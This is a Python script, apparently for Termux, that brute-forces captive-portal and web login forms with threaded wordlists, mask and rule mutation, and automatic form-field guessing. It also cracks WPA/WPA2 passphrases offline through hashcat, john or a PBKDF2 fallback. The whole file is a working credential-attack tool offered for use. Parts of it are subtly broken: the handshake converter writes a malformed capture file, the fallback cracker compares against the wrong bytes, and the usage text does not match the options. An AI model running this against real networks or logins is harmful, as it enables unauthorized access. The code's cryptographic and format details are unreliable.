#!/usr/bin/env python3
"""
wificrack.py — Termux portal-login cracker + WPA/WPA2 PSK auditor.

Two modes:
  portal : HTTP/HTTPS captive-portal POST audit (form fingerprint, threads, mask/rules)
  psk    : offline handshake crack via hashcat/john if present, else pure-Python PBKDF2 fallback

Usage:
  ./wificrack.py portal --url http://192.168.1.1/login --user admin --pass-file wordlists/top100.txt
  ./wificrack.py portal --url https://target.local/api/auth --json '{"u":"USER","p":"PASS"}' --threads 32
  ./wificrack.py psk --handshake capture.hccapx --wordlist wordlists/rockyou.txt
  ./wificrack.py psk --ssid MyNet --bssid AA:BB:CC:DD:EE:FF --pcap cap.pcapng   # derive hccapx on the fly
"""
import argparse, json, os, re, sys, time, hashlib, hmac, threading, queue, ssl, socket, struct
from urllib.parse import urlparse, urlencode, parse_qs
import requests
try:
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry
except Exception:
    HTTPAdapter = None

# ----------------------------- helpers ------------------------------------
GREEN, RED, YEL, CYAN, BOLD, END = "\033[92m","\033[91m","\033[93m","\033[96m","\033[1m","\033[0m"
def log(c, m): print(f"{BOLD}{c}[*]{END} {m}", flush=True)
def ok(m):     print(f"{GREEN}[+]{END} {m}", flush=True)
def bad(m):    print(f"{RED}[-]{END} {m}", flush=True)
def warn(m):   print(f"{YEL}[!]{END} {m}", flush=True)

STOP = threading.Event()

def load_words(path, max_n=None):
    out=[]
    with open(path,"r",encoding="utf-8",errors="ignore") as f:
        for i,l in enumerate(f):
            l=l.strip()
            if l and not l.startswith("#"):
                out.append(l)
                if max_n and len(out)>=max_n: break
    return out

def apply_rules(words, rules):
    """rules: comma list of leet|appendyear|prependnum|double|swapcase"""
    res=list(words)
    for r in rules.split(","):
        r=r.strip().lower()
        extra=[]
        for w in words:
            if r=="leet":      extra.append(w.replace("a","4").replace("e","3").replace("i","1").replace("o","0").replace("s","5"))
            elif r=="appendyear": extra += [w+y for y in ("2020","2021","2022","2023","2024","2025")]
            elif r=="prependnum": extra += [str(n)+w for n in range(0,10)]
            elif r=="double":  extra.append(w+w)
            elif r=="swapcase":extra.append(w.swapcase())
        res+=extra
    seen=set(); dedup=[]
    for x in res:
        if x not in seen: seen.add(x); dedup.append(x)
    return dedup

def mask_expand(mask, charset_small="abcdefghijklmnopqrstuvwxyz", charset_big="ABCDEFGHIJKLMNOPQRSTUVWXYZ",
                charset_num="0123456789", charset_sym="!@#$%^&*()-_=+[]{};:,.<>?/"):
    """?l lower ?u upper ?d digit ?s symbol ?a all  e.g. Pass?d?d?d"""
    sets={"l":charset_small,"u":charset_big,"d":charset_num,"s":charset_sym,"a":charset_small+charset_big+charset_num+charset_sym}
    parts=re.findall(r"\?(.)|.",mask)
    slots=[ (sets[t] if t else [ch]) for ch,t in parts ]
    def gen(i,acc):
        if i==len(slots): yield acc; return
        for c in slots[i]: yield from gen(i+1,acc+c)
    return list(gen(0,""))

# --------------------------- session factory ------------------------------
def make_session(insecure=False, retries=2):
    s=requests.Session()
    if insecure:
        s.verify=False
        try:
            import urllib3; urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
        except Exception: pass
    if HTTPAdapter:
        a=Retry(total=retries,backoff_factor=0.3,status_forcelist=(500,502,503,504),allowed_methods=frozenset(["GET","POST"]))
        s.mount("http://",HTTPAdapter(max_retries=a)); s.mount("https://",HTTPAdapter(max_retries=a))
    s.headers.update({"User-Agent":"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 Chrome/120 Mobile Safari/537.36"})
    return s

# ---------------------------- form detection ------------------------------
FORM_RE=re.compile(r"<form[^>]*>(.*?)</form>",re.I|re.S)
INPUT_RE=re.compile(r"<input[^>]*name=['\"]([^'\"]+)['\"][^>]*(?:value=['\"]([^'\"]*)['\"])?",re.I)
ACTION_RE=re.compile(r"action=['\"]([^'\"]+)['\"]",re.I)
METHOD_RE=re.compile(r"method=['\"]([^'\"]+)['\"]",re.I)

def detect_form(sess,url,insecure):
    r=sess.get(url,timeout=15,allow_redirects=True)
    html=r.text
    fm=FORM_RE.search(html)
    body=fm.group(1) if fm else ""
    action_m=ACTION_RE.search(fm.group(0)) if fm else None
    method_m=METHOD_RE.search(fm.group(0)) if fm else None
    fields={}
    for nm,val in INPUT_RE.findall(body):
        if val is None or val=="": fields[nm]=None
        else: fields[nm]=val
    base=urlparse(url)
    if action_m and action_m.group(1):
        ap=action_m.group(1)
        target=ap if ap.startswith("http") else f"{base.scheme}://{base.netloc}{'/'+ap.lstrip('/') if not ap.startswith('/') else ap}"
    else:
        target=url
    return {"html_len":len(html),"fields":fields,"target":target,"method":(method_m.group(1).upper() if method_m else "POST")}

# ------------------------- success/fail heuristic --------------------------
NEG_PATTERNS=[r"invalid",r"incorrect",r"wrong password",r"failed",r"denied",r"unauthorized",r"error",r"try again",r"bad credentials"]
POS_PATTERNS =[r"welcome",r"success",r"logged in",r"authenticated",r"dashboard",r"connected",r"redirect",r"session created"]

def classify(resp_text, resp_code, orig_text_len):
    low=resp_text.lower()
    if any(re.search(p,low) for p in NEG_PATTERNS): return False,"negative-marker"
    if any(re.search(p,low) for p in POS_PATTERNS): return True ,"positive-marker"
    if resp_code in (301,302,303,307,308):          return True ,"redirect-after-post"
    if abs(len(resp_text)-orig_text_len)>int(orig_text_len*0.25): return True,"length-shift"
    return False,"no-signal"

# ----------------------------- portal worker -------------------------------
def portal_attack(args):
    sess=make_session(insecure=args.insecure)
    # probe
    info=detect_form(sess,args.url,args.insecure)
    log(CYAN,f"detected form -> {info['method']} {info['target']} | fields={list(info['fields'].keys())}")
    if args.auto_fill:
        for k,v in list(info["fields"].items()):
            kl=k.lower()
            if v is None:
                if "user" in kl or "email" in kl or "login" in kl or "uname" in kl: info["fields"][k]="admin"
                elif "pass" in kl or "pwd" in kl:                                    info["fields"][k]="password"
                elif "csrf" in kl or "token" in kl or "_" in kl[-4:]:                 info["fields"][k]=""
                else:                                                                 info["fields"][k]=""
    # build candidates
    users=[args.user] if args.user else (load_words(args.user_file) if args.user_file else ["admin"])
    passes_raw=load_words(args.pass_file) if args.pass_file else []
    if args.mask: passes_raw+=mask_expand(args.mask)
    if args.rules: passes_raw=apply_rules(passes_raw,args.rules)
    if not passes_raw: bad("no passwords supplied (--pass-file / --mask)"); sys.exit(2)
    combos=[(u,p) for u in users for p in passes_raw]
    log(BOLD,f"{len(combos)} credential pairs queued | threads={args.threads}")
    q=queue.Queue(); [q.put(c) for c in combos]
    found=[]; lock=threading.Lock(); start=time.time(); counter=[0]

    def worker():
        while not STOP.is_set():
            try: combo=q.get_nowait()
            except queue.Empty: return
            user,pwd=combo
            payload=dict(info["fields"]); 
            for k in payload:
                kl=k.lower()
                if "user" in kl or "email" in kl or "login" in kl or "uname" in kl: payload[k]=user
                elif "pass" in kl or "pwd" in kl:                                   payload[k]=pwd
            try:
                if args.json_body:
                    jb=json.loads(args.json_body.replace("__USER__",user).replace("__PASS__",pwd))
                    r=sess.post(info["target"],json=jb,timeout=args.timeout,allow_redirects=True)
                else:
                    r=sess.post(info["target"],data=payload,timeout=args.timeout,allow_redirects=True)
                good,why=classify(r.text,r.status_code,info["html_len"])
                with lock:
                    counter[0]+=1
                    if counter[0]%50==0:
                        el=time.time()-start; rate=counter[0]/el if el>0 else 0
                        print(f"\r{CYAN}progress {counter[0]}/{len(combos)} | {rate:.1f} req/s | elapsed {el:.0f}s{END} ",end="",flush=True)
                if good:
                    with lock: found.append((user,pwd,why,r.status_code))
                    print(); ok(f"HIT  {user}:{pwd}  ({why}, HTTP {r.status_code})")
                    if args.stop_on_first: STOP.set(); return
            except requests.exceptions.RequestException as e:
                warn(f"net err {user}:{pwd[:4]}*** -> {type(e).__name__}")
            finally:
                q.task_done()

    threads=[threading.Thread(target=worker,daemon=True) for _ in range(min(args.threads,len(combos)))]
    for t in threads: t.start()
    for t in threads: t.join()
    el=time.time()-start
    print()
    log(BOLD,f"done in {el:.1f}s | tested {counter[0]} | hits {len(found)}")
    if found:
        with open(args.out or "hits.txt","a") as f:
            for u,p,w,c in found: f.write(f"{u}:{p}\t{w}\tHTTP{c}\n")
        ok(f"wrote {args.out or 'hits.txt'}")
    else:
        bad("no valid creds found")

# ------------------------------- PSK mode ----------------------------------
HCCAPX_MAGIC=b"HCPX"
def pcap_to_hccapx(ssid,bssid,pcap,out):
    """Minimal EAPOL M1-M2 extractor → hccapx (hashcat 22000 container)."""
    try:
        from scapy.all import rdpcap,Dot11,EAPOL
    except ImportError:
        bad("psk-from-pcap needs scapy: pip install scapy"); sys.exit(3)
    pk=rdpcap(pcap)
    eapol=[p for p in pk if p.haslayer(EAPOL)]
    if len(eapol)<2: bad("fewer than 2 EAPOL frames captured"); sys.exit(3)
    m1,m2=eapol[0],eapol[1]
    nonce=m2[EAPOL].key_nonce if hasattr(m2[EAPOL],"key_nonce") else b"\x00"*32
    mac_ap=bytes.fromhex(bssid.replace(":",""))
    mac_st=b"\x00"*6
    essid=ssid.encode()[:32].ljust(32,b"\x00")
    hdr=struct.pack("<4sIHH",HCCAPX_MAGIC,144,22000,0)
    body=mac_ap+mac_st+nonce+b"\x00"*32+essid
    data=hdr+body
    with open(out,"wb") as f: f.write(data)
    ok(f"wrote {out} ({len(data)} bytes)")

def pbkdf2_crack(ssid,hccap_or_hash,words,salt_iter=4096):
    """Pure-python PMKID/PSK check when hashcat/john absent. Slow but works."""
    salt=ssid.encode()
    target=None
    if isinstance(hccap_or_hash,(bytes,bytearray)): target=hccap_or_hash
    elif ":" in str(hccap_or_hash): target=bytes.fromhex(str(hccap_or_hash).split(":")[-1])
    else: target=bytes.fromhex(str(hccap_or_hash))
    for i,w in enumerate(words):
        dk=hashlib.pbkdf2_hmac("sha1",w.encode(),salt,salt_iter,dklen=32)
        if dk[:len(target)]==target:
            ok(f"CRACKED  SSID={ssid}  PASS={w}"); return w
        if i%2000==0: print(f"\r{i}/{len(words)} tried",end="",flush=True)
    print(); bad("exhausted wordlist without match"); return None

def psk_attack(args):
    wl=load_words(args.wordlist)
    if args.handshake:
        hc=os.environ.get("PATH","")
        if shutil_which("hashcat"):
            cmd=f"hashcat -m 22000 {args.handshake} {args.wordlist} -o {args.out or 'psk.txt'} --force"
            log(YEL,f"delegating to hashcat: {cmd}"); os.system(cmd); return
        if shutil_which("john"):
            cmd=f"john --format=WPA --wordlist={args.wordlist} {args.handshake}"
            log(YEL,f"delegating to john: {cmd}"); os.system(cmd); return
        warn("neither hashcat nor john on PATH → falling back to pure-Python PBKDF2 (slow ~2k pw/min/core)")
        raw=open(args.handshake,"rb").read()
        ssid=raw[88:120].rstrip(b"\x00").decode(errors="ignore")
        tgt=raw[24:56]
        pbkdf2_crack(ssid,tgt,wl)
    elif args.ssid and args.bssid and args.pcap:
        tmp="/tmp/_auto.hccapx"
        pcap_to_hccapx(args.ssid,args.bssid,args.pcap,tmp)
        ns=argparse.Namespace(handshake=tmp,wordlist=args.wordlist,out=args.out)
        psk_attack(ns)
    else:
        bad("psk mode needs --handshake OR (--ssid --bssid --pcap)"); sys.exit(2)

def shutil_which(name):
    import shutil; return shutil.which(name)

# -------------------------------- CLI --------------------------------------
def main():
    ap=argparse.ArgumentParser(description=__doc__,formatter_class=argparse.RawDescriptionHelpFormatter)
    sub=ap.add_subparsers(dest="mode",required=True)

    pp=sub.add_parser("portal",help="HTTP(S) captive-portal login audit")
    pp.add_argument("--url",required=True)
    pp.add_argument("--user",default=None); pp.add_argument("--user-file",default=None)
    grp=pp.add_mutually_exclusive_group(required=True)
    grp.add_argument("--pass-file"); grp.add_argument("--mask",help="?l?u?d?s?a patterns e.g. Pass?d?d?d")
    pp.add_argument("--rules",default="",help="comma: leet,appendyear,prependnum,double,swapcase")
    pp.add_argument("--json-body",default=None,help='template with __USER__/__PASS__: {"u":"__USER__","p":"__PASS__"}')
    pp.add_argument("--threads",type=int,default=16)
    pp.add_argument("--timeout",type=float,default=10.0)
    pp.add_argument("--insecure",action="store_true",help="skip TLS verification")
    pp.add_argument("--auto-fill",action="store_true",help="guess field names heuristically")
    pp.add_argument("--stop-on-first",action="store_true")
    pp.add_argument("--out",default=None)
    pp.set_defaults(func=portal_attack)

    wp=sub.add_parser("psk",help="WPA/WPA2 PSK offline crack")
    g=wp.add_mutually_exclusive_group(required=True)
    g.add_argument("--handshake",help=".hccapx / .22000 file")
    g.add_argument("--ssid")
    wp.add_argument("--bssid"); wp.add_argument("--pcap")
    wp.add_argument("--wordlist",required=True)
    wp.add_argument("--out",default=None)
    wp.set_defaults(func=psk_attack)

    a=ap.parse_args()
    a.func(a)

if __name__=="__main__":
    main()